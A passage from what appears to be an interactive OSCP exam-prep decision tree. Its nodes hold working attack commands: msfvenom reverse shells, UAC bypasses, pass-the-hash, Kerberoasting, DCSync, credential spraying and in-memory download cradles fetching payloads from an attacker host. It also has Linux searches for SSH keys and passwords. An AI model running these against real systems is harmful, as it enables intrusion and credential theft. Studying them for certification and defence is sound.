dir /s /b C:\\Users\\*.txt 2>nul
dir /s /b C:\\*pass* 2>nul
dir /s /b C:\\*.config 2>nul`,
    warn: null,
    choices: [
      { label: "Found NTLM hash — Pass the Hash", next: "pth" },
      { label: "Found plaintext creds", next: "creds_found" },
      { label: "Check DPAPI (browser/credential manager)", next: "dpapi" },
    ],
  },

  pth: {
    phase: "WINDOWS",
    title: "Pass the Hash",
    body: "NTLM hashes authenticate without cracking. evil-winrm, psexec, wmiexec — all work with hashes directly.",
    cmd: `# evil-winrm (WinRM — port 5985/5986)
evil-winrm -i $IP -u administrator -H <NTLM_HASH>

# impacket-psexec
impacket-psexec domain/administrator@$IP -hashes :NTLM_HASH

# impacket-wmiexec (stealthier)
impacket-wmiexec domain/administrator@$IP -hashes :NTLM_HASH

# impacket-smbexec
impacket-smbexec domain/administrator@$IP -hashes :NTLM_HASH

# CME verification
crackmapexec smb $IP -u administrator -H <NTLM_HASH>
crackmapexec winrm $IP -u administrator -H <NTLM_HASH>`,
    warn: null,
    choices: [
      { label: "Got admin shell!", next: "got_root_windows" },
    ],
  },

  windows_manual_enum: {
    phase: "WINDOWS",
    title: "Windows Manual Enumeration",
    body: "WinPEAS missed something — or you need to understand what it found. Methodical manual enumeration across every category. Check each before concluding nothing is there.",
    cmd: `# ── SYSTEM BASELINE ──────────────────────
systeminfo
whoami /all          # privs, groups, token integrity level
net user %USERNAME%
net localgroup administrators

# ── SERVICES ─────────────────────────────
wmic service get name,displayname,startmode,pathname | findstr /v "C:\\Windows"
Get-WmiObject win32_service | where {$_.PathName -notlike "*Windows*"} | select Name,PathName,StartMode

# ── SCHEDULED TASKS ──────────────────────
schtasks /query /fo LIST /v | findstr /i "task\|run\|next\|status\|as user"
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | Select TaskName,Actions

# ── INSTALLED SOFTWARE ────────────────────
wmic product get name,version
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName,DisplayVersion

# ── REGISTRY AUTORUNS ─────────────────────
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# ── NETWORK INTERNALS ─────────────────────
netstat -ano
# Internal ports not in nmap = local-only services
# Exploitable via port forward
route print    # other subnets?
arp -a         # other hosts seen?`,
    warn: "netstat -ano reveals services listening on 127.0.0.1 that nmap never saw. These are local-only services — pivot to them via port forward. Common finds: internal web panels, DB services, dev servers.",
    choices: [
      { label: "Suspicious scheduled task", next: "win_schtask" },
      { label: "DLL hijack opportunity", next: "win_dll_hijack" },
      { label: "UAC blocking — need to bypass", next: "win_uac_bypass" },
      { label: "Internal listening port", next: "pivot_start" },
      { label: "Nothing — check stored credentials", next: "windows_creds" },
    ],
  },

  win_schtask: {
    phase: "WINDOWS",
    title: "Scheduled Task Exploitation",
    body: "A task running as SYSTEM that executes a file you can write is a direct privesc. Three questions: what does it run, can you modify it, when does it trigger?",
    cmd: `# ── INVESTIGATE THE TASK ─────────────────
schtasks /query /fo LIST /v /tn "TaskName"
# Key fields:
#   Run As User: SYSTEM        <- privilege you gain
#   Task To Run: C:\path\exe   <- can you write this file?
#   Next Run Time:             <- when does it fire?

# ── CHECK WRITE PERMISSIONS ──────────────
icacls "C:\path\to\task\binary.exe"
# Look for: (F) Full  (M) Modify  (W) Write for your user

accesschk.exe /accepteula -wuv "C:\path\to\binary.exe"

# ── EXPLOIT: REPLACE BINARY ──────────────
# Generate payload
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe

# Transfer to target
certutil -urlcache -split -f http://$LHOST/shell.exe C:\path\to\binary.exe

# Start listener
nc -nlvp $LPORT

# Trigger task immediately (if you have rights)
schtasks /run /tn "TaskName"
# Otherwise: wait for Next Run Time

# ── EXPLOIT: MODIFY SCRIPT ───────────────
# If task runs .bat or .ps1 you can write:
echo C:\Windows\Temp\shell.exe >> C:\path\to\task.bat`,
    warn: "If Next Run Time is hours away: check schtasks /run to force trigger. If denied, set a timer and come back — don't burn time waiting. Move to another machine.",
    choices: [
      { label: "Task triggered — SYSTEM shell", next: "got_root_windows" },
      { label: "Cannot write — try DLL hijack", next: "win_dll_hijack" },
    ],
  },

  win_dll_hijack: {
    phase: "WINDOWS",
    title: "DLL Hijacking",
    body: "Privileged process searches for a DLL in a directory you can write — plant your own. Windows DLL search order is the attack surface. 64-bit process needs 64-bit DLL.",
    cmd: `# ── FIND CANDIDATES ──────────────────────
# Method 1: Procmon filter (if RDP)
# Filter: Result = NAME NOT FOUND, Path ends .dll
# Look for: SYSTEM process searching writable directories

# Method 2: Check service directories for write access
Get-WmiObject win32_service | where {$_.State -eq "Running"} | select Name,PathName
accesschk.exe /accepteula -wud "C:\Program Files\VulnApp\"

# Method 3: PowerSploit
Find-PathDLLHijack
Find-ProcessDLLHijack

# DLL search order (simplified):
# 1. Application directory
# 2. System32
# 3. System (SysWOW64)
# 4. Windows directory
# 5. Current directory
# 6. PATH directories  <- often writable!

# ── CHECK PATH FOR WRITABLE DIRS ─────────
$env:PATH -split ';' | % { icacls $_ 2>$null | findstr /i "everyone\|users\|modify\|write" }

# ── CREATE MALICIOUS DLL ─────────────────
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT \
  -f dll -o target.dll

# ── PLANT AND TRIGGER ────────────────────
copy target.dll "C:\writable\path\missing.dll"
nc -nlvp $LPORT

# Restart service
sc stop VulnService && sc start VulnService`,
    warn: "msfvenom -f dll defaults to 32-bit. For 64-bit processes use windows/x64/shell_reverse_tcp explicitly. Mismatched architecture = the DLL loads but silently fails.",
    choices: [
      { label: "DLL loaded — SYSTEM shell", next: "got_root_windows" },
      { label: "Cannot restart service — try UAC bypass", next: "win_uac_bypass" },
    ],
  },

  win_uac_bypass: {
    phase: "WINDOWS",
    title: "UAC Bypass — Medium to High Integrity",
    body: "In Administrators group but commands fail? UAC is blocking medium integrity. Bypass to elevate to high integrity without a GUI prompt. Requires local admin group membership — check first.",
    cmd: `# ── CONFIRM UAC IS THE ISSUE ─────────────
whoami /groups | findstr /i "mandatory\|integrity"
# Medium Mandatory Level = UAC restricting you
# High Mandatory Level = already elevated, not UAC

# ── METHOD 1: FODHELPER (Win 10/11) ──────
# Pure registry — no binary needed
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" \
  -Name "DelegateExecute" -Value ""
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" \
  -Name "(default)" -Value "C:\Windows\Temp\shell.exe"
Start-Process "C:\Windows\System32\fodhelper.exe"

# Cleanup
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force

# ── METHOD 2: EVENTVWR (older Windows) ───
New-Item "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\mscfile\shell\open\command" \
  "(default)" "C:\Windows\Temp\shell.exe"
Start-Process "C:\Windows\System32\eventvwr.exe"

# ── METHOD 3: CMSTP.EXE ──────────────────
# Requires crafted .inf file
# Reference: MITRE T1218.003

# ── METHOD 4: UACME ──────────────────────
# 60+ bypass methods, regularly updated
# Transfer UACMe.exe — run with method number
.\Akagi64.exe 33 C:\Windows\Temp\shell.exe

# ── LISTENER ─────────────────────────────
nc -nlvp $LPORT`,
    warn: "If whoami /groups shows you are NOT in the Administrators group — UAC bypass won't help. You need actual privilege escalation first, not just integrity elevation. These are different problems.",
    choices: [
      { label: "High integrity shell achieved", next: "got_root_windows" },
      { label: "Not in Administrators — wrong path", next: "winpeas" },
      { label: "Try token impersonation instead", next: "token_privs" },
    ],
  },

  got_root_windows: {
    phase: "WINDOWS",
    title: "SYSTEM — Windows",
    body: "SYSTEM shell. Get proof, take the screenshot correctly. whoami + hostname + ipconfig + proof.txt all visible.",
    cmd: `whoami   # should show NT AUTHORITY\\SYSTEM or Administrator
hostname
ipconfig /all
type C:\\Users\\Administrator\\Desktop\\proof.txt

# Screenshot checklist:
# ✅ whoami showing SYSTEM or Administrator
# ✅ hostname visible
# ✅ ipconfig showing target IP
# ✅ type proof.txt showing hash
# ✅ All in ONE screenshot`,
    warn: null,
    choices: [
      { label: "New subnet in route print — pivot!", next: "pivot_start" },
      { label: "Back to start — next machine", next: "start" },
    ],
  },

  // ══════════════════════════════════════════
  //  ACTIVE DIRECTORY
  // ══════════════════════════════════════════
  ad_start: {
    phase: "AD",
    title: "Active Directory — Assumed Breach",
    body: "OSCP+ gives you low-priv domain creds. You're starting inside. Add DC to /etc/hosts, enumerate the domain, run BloodHound immediately.",
    cmd: `# Add DC to hosts
echo "$IP dc01.domain.com domain.com" >> /etc/hosts

# Verify connectivity
crackmapexec smb $IP -u user -p 'pass'

# Initial domain recon
crackmapexec smb $IP -u user -p 'pass' --users
crackmapexec smb $IP -u user -p 'pass' --groups
crackmapexec smb $IP -u user -p 'pass' --shares
crackmapexec smb $IP -u user -p 'pass' --pass-pol   # check lockout policy!

# LDAP enum
ldapsearch -x -h $IP -D "user@domain.com" -w 'pass' \\
  -b "dc=domain,dc=com" "(objectClass=user)" | grep sAMAccountName`,
    warn: "Check the password policy BEFORE any spraying. Lockouts during the exam are catastrophic.",
    choices: [
      { label: "Run BloodHound (mandatory)", next: "bloodhound" },
      { label: "Run Responder first (passive hash capture)", next: "responder" },
      { label: "AS-REP Roast first (no pre-auth accounts)", next: "asrep_roast" },
      { label: "Kerberoast (SPN accounts)", next: "kerberoast" },
      { label: "Password spray (carefully)", next: "ad_spray" },
    ],
  },

  bloodhound: {
    phase: "AD",
    title: "BloodHound",
    body: "Run this early and let it collect in the background. BloodHound will show you paths you'd never find manually. Shortest Path to DA is your first query.",
    cmd: `# bloodhound-python from Kali (no agent needed)
bloodhound-python -u user -p 'pass' \\
  -d domain.com -ns $IP -c All

# Or SharpHound from Windows target
iwr http://$LHOST/SharpHound.exe -OutFile C:\\Windows\\Temp\\sh.exe
.\\sh.exe -c All --zipfilename bh.zip

# Start BloodHound
sudo neo4j start
bloodhound

# Key queries to run immediately:
# 1. Shortest Path to Domain Admins
# 2. Find AS-REP Roastable Users
# 3. Find Kerberoastable Users
# 4. Find Principals with DCSync Rights
# 5. Computers Where Domain Users are Local Admin`,
    warn: null,
    choices: [
      { label: "Kerberoastable accounts found", next: "kerberoast" },
      { label: "AS-REP Roastable accounts found", next: "asrep_roast" },
      { label: "ACL abuse path found", next: "acl_abuse" },
      { label: "Delegation abuse path found", next: "delegation" },
      { label: "AD CS vulnerable templates", next: "adcs" },
      { label: "BloodHound found nothing useful", next: "ad_manual" },
      { label: "No direct path — password spray", next: "ad_spray" },
    ],
  },

  asrep_roast: {
    phase: "AD",
    title: "AS-REP Roasting",
    body: "Accounts with pre-auth disabled hand you encrypted TGTs to crack offline. Fast, no noise, no lockout risk.",
    cmd: `# From Kali — no password needed if pre-auth disabled
impacket-GetNPUsers domain.com/ \\
  -usersfile users.txt -dc-ip $IP \\
  -request -outputfile asrep.txt

# With creds (more reliable)
impacket-GetNPUsers domain.com/user:'pass' \\
  -dc-ip $IP -request -o asrep.kerb

# Kerbrute (also finds them)
./kerbrute_linux_amd64 userenum \\
  -d domain.com --dc $IP \\
  /opt/SecLists/Usernames/Names/names.txt

# Crack
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.txt rockyou.txt -r best64.rule`,
    warn: null,
    choices: [
      { label: "Cracked — got new account creds", next: "creds_found" },
      { label: "No pre-auth disabled accounts — Kerberoast", next: "kerberoast" },
    ],
  },

  kerberoast: {
    phase: "AD",
    title: "Kerberoasting",
    body: "Request service tickets for any SPN-enabled account and crack them offline. Service accounts often have weak passwords.",
    cmd: `# From Kali with creds
impacket-GetUserSPNs domain.com/user:'pass' \\
  -dc-ip $IP -request -outputfile tgs.txt

# Check what accounts exist
impacket-GetUserSPNs domain.com/user:'pass' \\
  -dc-ip $IP

# PowerView on Windows
Get-NetUser -SPN | select samaccountname,serviceprincipalname

# Rubeus on Windows
.\\Rubeus.exe kerberoast /outfile:tgs.txt

# Crack
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule`,
    warn: null,
    choices: [
      { label: "Cracked service account hash!", next: "creds_found" },
      { label: "No luck cracking — try ACL abuse", next: "acl_abuse" },
    ],
  },

  ad_spray: {
    phase: "AD",
    title: "Password Spraying",
    body: "One password across all users. Seasonal passwords, company name variants, default creds. One attempt per account per window to avoid lockout.",
    cmd: `# CHECK POLICY FIRST
crackmapexec smb $IP -u user -p 'pass' --pass-pol

# Spray with CME
crackmapexec smb $IP -u users.txt -p 'Password123!' --continue-on-success
crackmapexec smb $IP -u users.txt -p 'Winter2024!' --continue-on-success

# Kerbrute spray (faster, less noisy)
./kerbrute_linux_amd64 passwordspray \\
  -d domain.com --dc $IP \\
  users.txt 'Password123!'

# Common spray passwords:
# Password1!   Welcome1!   Summer2024!
# Winter2025!  Company123! <CompanyName>1!`,
    warn: "One spray attempt per lockout window. Locking accounts = exam failure.",
    choices: [
      { label: "Spray hit — got new creds", next: "creds_found" },
      { label: "Nothing — AS-REP roast or Kerberoast", next: "asrep_roast" },
    ],
  },

  acl_abuse: {
    phase: "AD",
    title: "ACL Abuse",
    body: "BloodHound showed you a misconfigured ACL. GenericAll, GenericWrite, WriteDACL, ForceChangePassword — all paths to escalation.",
    cmd: `# GenericAll over user — force password reset
Set-DomainUserPassword -Identity targetuser \\
  -AccountPassword (ConvertTo-SecureString 'Hack3d!23' -AsPlainText -Force)

# GenericAll over group — add yourself
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'youruser'

# WriteDACL — grant yourself DCSync
Add-DomainObjectAcl \\
  -TargetIdentity "DC=domain,DC=com" \\
  -PrincipalIdentity youruser \\
  -Rights DCSync

# ForceChangePassword
$cred = New-Object System.Net.NetworkCredential("","NewPass123!")
Set-DomainUserPassword -Identity target -AccountPassword $cred.SecurePassword

# DCSync once you have rights
.\\mimikatz.exe "privilege::debug" \\
  "lsadump::dcsync /domain:domain.com /user:administrator" "exit"`,
    warn: null,
    choices: [
      { label: "Got DA hash via DCSync", next: "dcsync" },
      { label: "Added self to Domain Admins — lateral move", next: "lateral_movement" },
    ],
  },

  delegation: {
    phase: "AD",
    title: "Delegation Attacks",
    body: "Unconstrained delegation captures TGTs. Constrained delegation allows S4U impersonation. Both can reach Domain Admin.",
    cmd: `# Find unconstrained delegation
Get-DomainComputer -Unconstrained | select name
Get-DomainUser -AllowDelegation -AdminCount | select name

# Find constrained delegation
Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto

# S4U2Self + S4U2Proxy (Rubeus — no MSF)
.\\Rubeus.exe s4u \\
  /user:svcaccount \\
  /rc4:NTLM_HASH \\
  /impersonateuser:administrator \\
  /msdsspn:"CIFS/dc01.domain.com" \\
  /ptt

# Verify ticket loaded
.\\Rubeus.exe klist`,
    warn: null,
    choices: [
      { label: "Ticket loaded — lateral move to DC", next: "lateral_movement" },
    ],
  },

  lateral_movement: {
    phase: "AD",
    title: "Lateral Movement",
    body: "Move between machines with creds, hashes, or Kerberos tickets. impacket suite covers everything — no MSF console needed.",
    cmd: `# evil-winrm (WinRM 5985/5986)
evil-winrm -i $TARGET -u admin -p 'pass'
evil-winrm -i $TARGET -u admin -H NTLM_HASH

# psexec (requires admin + file write to ADMIN$)
impacket-psexec domain/admin:'pass'@$TARGET
impacket-psexec domain/admin@$TARGET -hashes :NTLM_HASH

# wmiexec (stealthier — no service creation)
impacket-wmiexec domain/admin:'pass'@$TARGET

# smbexec
impacket-smbexec domain/admin:'pass'@$TARGET

# Pass-the-ticket
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass domain/admin@dc01.domain.com

# PowerShell remoting
Enter-PSSession -ComputerName $TARGET -Credential domain\\admin`,
    warn: null,
    choices: [
      { label: "On DC — DCSync everything", next: "dcsync" },
      { label: "On member server — privesc further", next: "windows_post_exploit" },
    ],
  },

  dcsync: {
    phase: "AD",
    title: "DCSync — Domain Owned",
    body: "DCSync dumps all domain hashes. You have replication rights — pull every account. This is game over for the domain.",
    cmd: `# Mimikatz DCSync (on Windows — no MSF)
.\\mimikatz.exe "privilege::debug" \\
  "lsadump::dcsync /domain:domain.com /user:administrator" \\
  "exit"

# Dump all hashes
.\\mimikatz.exe "privilege::debug" \\
  "lsadump::dcsync /domain:domain.com /all /csv" \\
  "exit"

# impacket-secretsdump (from Kali — no agent)
impacket-secretsdump domain/admin:'pass'@$DCIP
impacket-secretsdump domain/admin@$DCIP -hashes :NTLM_HASH
impacket-secretsdump domain/admin:'pass'@$DCIP -just-dc-ntlm

# PTH to DC as Administrator
evil-winrm -i $DCIP -u administrator -H <NTLM_HASH>`,
    warn: null,
    choices: [
      { label: "Domain Admin shell on DC — grab proof", next: "ad_complete" },
    ],
  },

  ad_complete: {
    phase: "AD",
    title: "Domain Admin — AD Set Complete",
    body: "40 points locked in. Screenshot each machine in the chain: initial workstation, pivot machine, DC. All three need proof.txt + whoami + hostname + IP.",
    cmd: `# On Domain Controller
whoami
hostname
ipconfig
type C:\\Users\\Administrator\\Desktop\\proof.txt

# Screenshot checklist for full AD set:
# ✅ Machine 1: whoami + hostname + IP + local.txt
# ✅ Machine 2: whoami + hostname + IP + local.txt
# ✅ DC: whoami (DA) + hostname + IP + proof.txt
# ✅ Full attack chain documented in report`,
    warn: null,
    choices: [
      { label: "Now hit the standalone machines", next: "start" },
    ],
  },

  // ══════════════════════════════════════════
  //  MINDSET — THE INNER PATH
  // ══════════════════════════════════════════

  mindset_preexam: {
    phase: "MINDSET",
    title: "Pre-Exam — Before the Clock Starts",
    body: "The exam begins before you click Start. Environment failure at hour 3 is not bad luck — it is skipped preparation. Do this now, while the mind is calm.",
    cmd: `# ── ENVIRONMENT ─────────────────────────
# VPN connected and stable
sudo openvpn ~/oscp.ovpn &
ping 10.10.10.1   # confirm routing

# Kali updated, tools present
which nmap gobuster feroxbuster ligolo-ng evil-winrm impacket-secretsdump

# Wordlists in place
ls /usr/share/wordlists/rockyou.txt
ls /usr/share/seclists/Discovery/Web-Content/

# Results folder template ready
mkdir -p ~/exam/{machine1,machine2,machine3,ad}/{scans,exploits,loot,screenshots,tunnels}

# ── TIME PLAN ────────────────────────────
# 23h 45m total. Suggested blocks:
# Hour  0-2:  Recon ALL machines in parallel. Do not exploit yet.
# Hour  2-6:  Attack highest-confidence target first.
# Hour  6-10: Second machine. AD set — push this if recon is clear.
# Hour 10-14: Third machine. Revisit stalled machines fresh.
# Hour 14-18: Fill gaps. Partial flags count.
# Hour 18-22: Documentation. Stop hacking at hour 22.
# Hour 22-24: Report finalization and submission.

# ── MENTAL CONTRACT ──────────────────────
# You will get stuck. That is part of the exam.
# Stuck is not failing. Stuck is information.
# When stuck: document what you know, rotate machine, return fresh.`,
    warn: "Enumerate ALL machines before deep-diving any single one. Parallel recon in the first 2 hours is the highest-leverage action of the entire exam.",
    choices: [
      { label: "Clock is running — start recon", next: "start" },
      { label: "I am already stuck mid-exam", next: "mindset_stuck" },
    ],
  },

  mindset_stuck: {
    phase: "MINDSET",
    title: "Arjuna on Kurukshetra",
    body: "You are not failing. The mind has contracted. Arjuna froze before the greatest battle of his life — not from lack of skill, but from overwhelm. Krishna did not tell him to try harder. He told him to see clearly. Stop. Do that now.",
    cmd: `# ── STOP THE SPIRAL ─────────────────────
# Close unnecessary terminals. One window.
# Write down — right now — what you actually know:

echo "Machine: $IP"
echo "Ports open: [list them]"
echo "Services: [list them]"
echo "What I tried: [list it]"
echo "What actually happened: [not what you expected — what happened]"
echo "What I have NOT tried: [honest list]"

# ── THE THREE QUESTIONS ──────────────────
# 1. Have I fully enumerated, or did I start exploiting too early?
#    gobuster/feroxbuster still running? Nmap UDP done?
# 2. Am I trying the same thing repeatedly expecting different results?
#    If yes — that vector is closed. Move.
# 3. Is there another machine I can make progress on right now?
#    Rotate. Come back in 45 minutes. Fresh eyes find what tired eyes miss.

# ── THE POMODORO RESET ───────────────────
# Set a timer: 25 minutes.
# Pick ONE specific thing to test. Not enumerate more. One thing.
# When the timer ends — stop. Assess. Decide.`,
    warn: "The most common OSCP failure is not insufficient skill — it is 4 hours on one rabbit hole while other machines sit untouched. Rotation is not giving up. It is strategy.",
    choices: [
      { label: "I think I am in a rabbit hole", next: "mindset_rabbithole" },
      { label: "I need to triage my time", next: "mindset_triage" },
      { label: "Back to recon — fresh start on this machine", next: "start" },
    ],
  },

  mindset_rabbithole: {
    phase: "MINDSET",
    title: "The Rabbit Hole",
    body: "A rabbit hole feels like progress because you are moving. But movement without position change is just spinning. The signs are specific. Check them now.",
    cmd: `# ── RABBIT HOLE DIAGNOSTIC ──────────────
# Answer honestly:

# 1. HOW LONG on this single vector?
#    > 45 minutes without forward movement = rabbit hole

# 2. WHAT IS YOUR EVIDENCE this vector is valid?
#    Gut feeling is not evidence.
#    A version number + confirmed CVE is evidence.
#    A confirmed parameter + confirmed reflection is evidence.

# 3. HAVE YOU GOOGLED THE EXACT ERROR MESSAGE?
#    Not the general technique — the exact error you are seeing.

# 4. HAVE YOU READ THE ACTUAL RESPONSE?
#    View page source. Read response headers.
#    What is the app actually telling you?

# ── THE EXIT PROTOCOL ────────────────────
# Document where you are — exact URL, payload, response.
# Write: Paused — potential vector, needs revisit
# Set it down completely.

# Rotate to a different machine NOW.
# Do not think about this machine for 45 minutes.
# When you return you will see it differently.
# This is not metaphor — it is how the brain processes problems offline.

# ── COMMON FALSE RABBIT HOLES ────────────
# "There must be a SQLi here" — have you tried other params?
# "This LFI should work" — tried /proc/self/environ, php://filter?
# "The exploit should work" — exact version match confirmed?
# "I just need to tweak the payload" — after 10 tweaks, vector is wrong`,
    warn: "Sunk cost is the enemy of the path. The time already spent is gone. The only question is: what is the best use of the time remaining?",
    choices: [
      { label: "Rotating — go back to start for another machine", next: "start" },
      { label: "I need to triage where to spend remaining time", next: "mindset_triage" },
      { label: "I have a real lead — back to targeted scan", next: "targeted_scan" },
    ],
  },


  // ══════════════════════════════════════════
  //  FILE TRANSFER
  // ══════════════════════════════════════════

  file_transfer: {
    phase: "SHELL",
    title: "File Transfer — Get Tools on Target",
    body: "Getting tools onto a target is a skill. Know at least 3 methods per OS — one will always be blocked. Start your HTTP server first, then choose delivery method based on what's available.",
    cmd: `# ── ATTACKER: START FILE SERVER ──────────
python3 -m http.server 80
python3 -m http.server 443   # if 80 blocked
# Or SMB share (Windows targets love this):
impacket-smbserver share . -smb2support
impacket-smbserver share /path/to/tools -smb2support -username user -password pass

# ── LINUX: DOWNLOAD TO TARGET ─────────────
wget http://$LHOST/linpeas.sh -O /tmp/lp.sh
curl http://$LHOST/linpeas.sh -o /tmp/lp.sh
curl http://$LHOST/shell.elf | bash   # fileless

# nc transfer (no HTTP available)
# Attacker: nc -nlvp 4444 < file.sh
# Target:   nc $LHOST 4444 > /tmp/file.sh

# base64 transfer (no network tools)
# Attacker: base64 -w0 linpeas.sh
# Target:   echo "BASE64" | base64 -d > /tmp/lp.sh

# SCP (if SSH available)
scp linpeas.sh user@$IP:/tmp/lp.sh

# ── WINDOWS: DOWNLOAD TO TARGET ──────────
# certutil (built-in, often allowed)
certutil -urlcache -split -f http://$LHOST/shell.exe C:\Windows\Temp\shell.exe

# PowerShell DownloadFile
powershell -c "(New-Object Net.WebClient).DownloadFile('http://$LHOST/shell.exe','C:\Windows\Temp\shell.exe')"

# PowerShell DownloadString (fileless — runs in memory)
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/shell.ps1')"

# bitsadmin (older Windows)
bitsadmin /transfer job http://$LHOST/shell.exe C:\Windows\Temp\shell.exe

# SMB copy (no HTTP needed — use impacket-smbserver)
copy \\$LHOST\share\shell.exe C:\Windows\Temp\shell.exe
# Or in PowerShell:
Copy-Item \\$LHOST\share\shell.exe C:\Windows\Temp\shell.exe

# curl (Windows 10+)
curl http://$LHOST/shell.exe -o C:\Windows\Temp\shell.exe

# ── WINDOWS: EXECUTE IN MEMORY ────────────
# PS DownloadString — never touches disk
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/Invoke-PowerShellTcp.ps1')"

# Encoded download cradle
$CMD = "IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/shell.ps1')"
echo $CMD | iconv -t UTF-16LE | base64 -w0
powershell -nop -w hidden -enc [OUTPUT]

# ── VERIFY TRANSFER ───────────────────────
# Linux
md5sum /tmp/file.sh
# Windows
certutil -hashfile C:\Windows\Temp\shell.exe MD5`,
    warn: "impacket-smbserver is the most reliable Windows transfer when HTTP is blocked. Modern Windows requires SMB2 — always add -smb2support. If Defender blocks the download, use the in-memory DownloadString cradle — it never writes to disk.",
    choices: [
      { label: "Tools transferred — Linux privesc", next: "linpeas" },
      { label: "Tools transferred — Windows privesc", next: "winpeas" },
      { label: "Transfer blocked — troubleshoot shell", next: "shell_troubleshoot" },
      { label: "Back to jump menu", next: "jump_menu" },
    ],
  },

  // ══════════════════════════════════════════
  //  CREDENTIAL REUSE
  // ══════════════════════════════════════════

  cred_reuse: {
    phase: "CREDS",
    title: "Credential Reuse — Spray Everything",
    body: "Password reuse is the most consistent win on OSCP. The moment you find any credential, spray it across every service before doing anything else. Takes 60 seconds and pays off constantly.",
    cmd: `# ── SET YOUR CREDS ───────────────────────
export USER=founduser
export PASS='foundpassword'
export HASH='aad3b435b51404eeaad3b435b51404ee:NTLMHASH'

# ── CRACKMAPEXEC — SPRAY ALL SERVICES ────
# SMB
crackmapexec smb $IP -u $USER -p $PASS
crackmapexec smb $IP -u $USER -H $HASH   # PtH

# WinRM
crackmapexec winrm $IP -u $USER -p $PASS

# SSH
crackmapexec ssh $IP -u $USER -p $PASS

# RDP
crackmapexec rdp $IP -u $USER -p $PASS

# FTP
crackmapexec ftp $IP -u $USER -p $PASS

# MSSQL
crackmapexec mssql $IP -u $USER -p $PASS

# Spray across subnet (OSCP internal network)
crackmapexec smb $SUBNET/24 -u $USER -p $PASS --continue-on-success
crackmapexec winrm $SUBNET/24 -u $USER -p $PASS

# ── READ CME OUTPUT ───────────────────────
# [+] = valid creds
# (Pwn3d!) = local admin — instant shell
# Use evil-winrm or psexec if Pwn3d

# ── CONNECT WITH VALID CREDS ─────────────
# WinRM (most common)
evil-winrm -i $IP -u $USER -p $PASS
evil-winrm -i $IP -u $USER -H $HASH

# SSH
ssh $USER@$IP

# SMB shell (psexec — needs admin share)
impacket-psexec $USER:$PASS@$IP
impacket-psexec -hashes $HASH $USER@$IP

# RDP
xfreerdp /u:$USER /p:$PASS /v:$IP /cert-ignore

# ── USERNAME VARIATIONS ───────────────────
# If exact user fails, try variations:
# admin, administrator, Administrator
# domain\\user, user@domain.com
# First.Last, firstlast, flast`,
    warn: "Pwn3d! in CME output means local admin. Stop and get that shell immediately — it is the highest-value finding in the output. (Pwn3d!) beats any further enumeration.",
    choices: [
      { label: "CME shows Pwn3d — get shell", next: "windows_post_exploit" },
      { label: "SSH access confirmed", next: "linux_post_exploit" },
      { label: "WinRM access — evil-winrm", next: "winrm_access" },
      { label: "Valid creds, no admin — keep enumerating", next: "targeted_scan" },
      { label: "Nothing worked — hash cracking", next: "hashcrack" },
    ],
  },

  // ══════════════════════════════════════════
  //  LINUX PASSWORD HUNTING
  // ══════════════════════════════════════════

  linux_password_hunt: {
    phase: "LINUX",
    title: "Linux Password Hunting",
    body: "Credentials live in config files, bash history, environment variables, and scripts. This is one of the most reliable Linux privesc paths and most people skip it. Search everything.",
    cmd: `# ── BASH HISTORY ─────────────────────────
cat ~/.bash_history
cat /home/*/.bash_history 2>/dev/null
cat /root/.bash_history 2>/dev/null
# Look for: ssh commands, mysql -p, passwords in commands

# ── ENVIRONMENT VARIABLES ─────────────────
env | grep -i "pass\|key\|secret\|token\|api\|db"
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i pass

# ── CONFIG FILES ──────────────────────────
find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" 2>/dev/null |   xargs grep -li "password\|passwd\|secret" 2>/dev/null

find / -name "*.php" 2>/dev/null |   xargs grep -li "password\|db_pass\|mysql_pass" 2>/dev/null

# Common locations
cat /var/www/html/config.php 2>/dev/null
cat /var/www/html/.env 2>/dev/null
cat /var/www/html/wp-config.php 2>/dev/null    # WordPress DB creds
cat /etc/phpmyadmin/config-db.php 2>/dev/null
cat /var/www/html/configuration.php 2>/dev/null # Joomla
find /var/www -name "*.conf" -exec grep -i "pass" {} + 2>/dev/null

# ── DATABASE CREDENTIAL FILES ─────────────
find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null
cat /home/*/.my.cnf 2>/dev/null    # MySQL client creds
cat /root/.my.cnf 2>/dev/null

# ── SSH KEYS ─────────────────────────────
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" 2>/dev/null
find / -name "*.pem" -o -name "*.key" 2>/dev/null
cat /home/*/.ssh/id_rsa 2>/dev/null
cat /root/.ssh/id_rsa 2>/dev/null
# Authorized keys — who can SSH in as this user?
cat /home/*/.ssh/authorized_keys 2>/dev/null

# ── SCRIPTS AND CRON ──────────────────────
find / -name "*.sh" 2>/dev/null | xargs grep -li "pass\|user\|cred" 2>/dev/null
cat /etc/crontab
ls -la /etc/cron*
find /var/spool/cron -type f 2>/dev/null | xargs cat 2>/dev/null

# ── RECENTLY MODIFIED FILES ───────────────
